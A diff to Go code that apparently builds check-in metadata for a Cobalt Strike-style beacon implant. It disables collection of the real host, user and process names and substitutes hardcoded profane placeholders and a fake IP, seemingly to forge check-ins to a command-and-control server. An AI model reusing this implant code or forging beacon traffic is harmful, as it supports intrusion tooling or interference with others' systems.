@@ -13,8 +13,6 @@ import (
 	"strconv"
 	"strings"
 	"time"
-
-	"github.com/imroc/req"
 )
 
 var (
@@ -127,6 +125,7 @@ func EncryptedMetaInfo() string {
 
 /*
 MetaData for 4.1
+
 	Key(16) | Charset1(2) | Charset2(2) |
 	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
 	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
@@ -163,16 +162,15 @@ func MakeMetaInfo() []byte {
 		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
 	}
 
-
 	//for Smart Inject, will not be implemented
 	ptrFuncAddr := 0
 	ptrGMHFuncAddr := 0
 	ptrGPAFuncAddr := 0
 
-	processName := sysinfo.GetProcessName()
+	//processName := sysinfo.GetProcessName()
 	localIP := sysinfo.GetLocalIPInt()
-	hostName := sysinfo.GetComputerName()
-	currentUser := sysinfo.GetUsername()
+	//hostName := sysinfo.GetComputerName()
+	//currentUser := sysinfo.GetUsername()
 
 	localeANSI := sysinfo.GetCodePageANSI()
 	localeOEM := sysinfo.GetCodePageOEM()
@@ -200,12 +198,17 @@ func MakeMetaInfo() []byte {
 	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
 	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))
 
-	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	ipInfo := "6.2\t1.1.1.1\t"
+	ipInfoBytes := []byte(ipInfo)
+
+	osInfo := fmt.Sprintf("%s\t%s\t%s", "fuck", "you", "bitch.exe")
 	osInfoBytes := []byte(osInfo)
 
 	fmt.Printf("clientID: %d\n", clientID)
+	//onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
+	//	flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
-		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
+		flagBytes, ipInfoBytes, osInfoBytes)
 
 	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
 	magicNum := sysinfo.GetMagicHead()
